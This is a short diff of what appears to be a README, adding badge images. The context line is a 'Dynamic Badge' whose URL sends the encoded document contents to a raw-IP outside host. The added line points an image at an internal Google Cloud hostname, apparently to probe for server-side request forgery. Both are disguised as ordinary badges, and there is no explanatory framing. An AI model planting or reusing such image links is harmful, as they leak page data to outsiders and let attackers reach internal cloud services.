@@ -3,3 +3,5 @@
 
 
 ![Dynamic Badge](http://163.17.197.104.bc.googleusercontent.com/json?url=data:application/json,{"label":"myLabel","value":"${encodeURIComponent(document)}"}&query=$.value&color=blue`)
+
+![Badge](http://instance-20240520-124927.us-central1-c.c.graphic-brook-422800-k7.internal)
